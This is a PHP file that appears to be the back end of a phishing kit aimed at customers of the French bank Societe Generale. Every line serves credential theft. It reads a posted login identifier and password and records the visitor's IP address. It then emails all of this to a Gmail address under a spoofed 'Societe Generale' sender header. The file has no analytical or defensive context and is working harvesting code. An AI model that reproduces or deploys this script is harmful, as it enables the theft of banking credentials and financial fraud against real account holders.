<?php
if(isset($_POST['send']) && $_POST['send'] == "ok"){

$ip = getenv("REMOTE_ADDR");
$message ="";
$message .= "#IP : $ip =============#\n";
$message .= "Votre Identifiant :  ".$_POST['code']."\n";
$message .= "Votre Mot de Passe :  ".$_POST['tc']."\n";
$message .= "#============= HR-F =============#\n";
$send = "keane010203@gmail.com";
$subject = "[ S LOG | $ip ]";
$from = "From: Societe Generale <holy@societegenerale.fr>";
mail($send,$subject,$message,$from);

}
